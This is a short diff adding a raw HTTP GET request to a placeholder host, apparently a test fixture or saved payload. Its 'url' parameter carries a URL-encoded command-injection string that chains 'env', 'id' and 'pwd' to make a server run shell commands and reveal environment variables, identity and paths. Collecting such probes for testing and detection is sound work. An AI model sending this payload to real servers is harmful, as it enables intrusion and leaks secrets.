@@ -1,0 +1,4 @@
+GET /a?url=%3B%2Benv%3B%2Bid%3B%2Bpwd HTTP/1.1
+Host: demo.example.com
+Connection: close
+
